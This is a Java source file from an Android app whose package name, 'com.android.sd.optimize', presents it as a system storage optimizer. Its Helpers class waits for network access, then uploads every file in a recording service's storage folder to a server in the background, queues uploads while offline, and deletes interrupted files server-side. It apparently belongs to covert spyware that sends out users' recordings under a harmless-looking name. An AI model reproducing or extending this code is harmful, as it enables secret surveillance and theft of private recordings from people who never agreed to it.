package com.android.sd.optimize;

import android.content.Context;
import android.content.ContextWrapper;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.util.Log;

import java.io.File;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;


public class Helpers extends ContextWrapper implements Runnable {
    int status = 0;
    Context mContext;
    DBHandler dbHandler;
    Util mUtil;
    String mCurrentFile;

    public Helpers(Context base) {
        super(base);
        mContext = base;
        dbHandler = new DBHandler(base);
    }

    void requesFiletUpload(String file) {
        mCurrentFile = file;
    }

    boolean isOnline() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }

    @Override
    public void run() {
        try {
            URL url = new URL("http://google.com");
            HttpURLConnection urlc = (HttpURLConnection) url.openConnection();
            urlc.setConnectTimeout(3000);
            urlc.connect();
            if (urlc.getResponseCode() == 200) {
                Log.i(AppGlobals.getLogTag(getClass()), "checking internet: " + urlc.getResponseCode());
                    if (mCurrentFile != null) {
                        ArrayList<String> arrayList = new ArrayList<>(Arrays.asList(mCurrentFile));
                        new Util(getApplicationContext()).execute(arrayList);
                    }
                        handlingInternetConnectivity();
            }
        } catch (MalformedURLException e1) {
            e1.printStackTrace();
        } catch (IOException e) {
            if (mCurrentFile != null) {
                dbHandler.createNewFileNameForUpload("filename", mCurrentFile);
            }
        }
    }

    void handlingInternetConnectivity() {
                deleteInterruptedFilesFromServer();
                uploadData();
    }

    void deleteInterruptedFilesFromServer() {
        ArrayList<String> list;
        list = dbHandler.retrieveDate("tobedeleted");
        if (list.size() > 0 && !list.isEmpty()) {
            new DeleteIntruptedFileTask().execute(list);
        }
    }

    void uploadData() {
        ArrayList<String> list;
        list = dbHandler.retrieveDate("filename");
        if (list.size() > 0) {
            new Util(mContext).execute(list);
            Log.i(AppGlobals.getLogTag(getClass()), "running upload task");
        }
    }

    class DeleteIntruptedFileTask extends AsyncTask<ArrayList<String>, String, String> {

        @Override
        protected String doInBackground(ArrayList<String>... arrayLists) {
            mUtil = new Util(mContext);
            Log.i(AppGlobals.getLogTag(getClass()), "delete file running");
            mUtil.deletedFileAtServer(arrayLists[0]);
            return null;
        }
    }

    void getFolderFilesIfAvailable() {
        File file = new File(RecordService.DEFAULT_STORAGE_LOCATION);
        File[] list;
        list = file.listFiles();
        System.out.println(list.length);
        System.out.println(list.toString());
        if (list.length > 0) {
            for (File item : list) {
                ArrayList<String> arrayList = new ArrayList<>(Arrays.asList(item.toString()));
                Log.i("logtag", "running files");
                new Util(mContext).execute(arrayList);
            }
        }
    }
}